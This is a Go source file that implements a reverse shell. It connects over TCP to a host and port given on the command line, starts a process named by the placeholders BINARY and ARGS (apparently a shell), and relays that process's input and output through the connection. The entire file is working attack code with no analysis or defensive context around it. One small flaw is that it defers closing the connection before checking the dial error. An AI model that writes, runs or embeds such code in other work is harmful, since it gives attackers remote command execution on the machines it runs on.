package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
)

func main() {
	var host = flag.String("host", "", "host")
	var port = flag.Int("port", 1234, "port")
	flag.Parse()

	if *host == "" {
		log.Fatalf("please provide a valid host")
	}

	x := fmt.Sprintf("%s:%d", *host, *port)
	log.Printf("connecting to %s", x)
	c, err := net.Dial("tcp", x)
	defer c.Close()
	if err != nil {
		log.Fatalf("error on dial: %v", err)
	}
	cmd := exec.Command(BINARY, ARGS...)
	stdin, err := cmd.StdinPipe()
	if err != nil {
		log.Fatalf("could not get stdin: %v", err)
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Fatalf("could not get stdout: %v", err)
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		log.Fatalf("could not get stderr: %v", err)
	}
	// needed as the process waits until stdin is closed
	// if we set stdin directly to c, an 'exit' will
	// not work and wait until the connection is
	// terminated
	go io.Copy(stdin, c)
	go io.Copy(c, stdout)
	go io.Copy(c, stderr)
	err = cmd.Run()
	if err != nil {
		log.Fatalf("error on run: %v", err)
	}
}
